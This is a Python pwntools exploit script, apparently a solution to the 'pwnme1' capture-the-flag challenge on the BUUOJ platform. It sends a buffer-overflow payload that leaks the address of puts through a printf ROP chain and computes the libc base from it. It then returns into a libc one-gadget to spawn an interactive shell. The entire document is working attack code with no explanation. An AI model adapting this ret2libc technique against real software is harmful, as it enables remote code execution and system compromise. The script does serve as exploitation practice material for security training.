import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwnme1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwnme1')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',28258)
			elf=ELF('./pwnme1')
			libc=ELF('../../i386libc/x86_libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		
		pay='a'*0xa0+'\x00'*8+p32(elf.plt['printf'])+p32(0x08048624)+p32(elf.got['puts'])
		io.recv()
		io.sendline('5')
		io.recv()
		io.sendline(pay)
		io.recvuntil('a'*0xa0+'...\n')

		libc_base=u32(io.recv(4))-libc.sym['puts']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		pay='a'*0xa0+'\x00'*8+p32(libc_base+0x3a812)#+p32(0x08048570)+p32(bin_sh_addr)+p32(0)
		# io.recvuntil('6. Exit    ')
		# io.sendline('5')
		io.recvuntil('Please input the name of fruit:')
		io.sendline(pay)





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue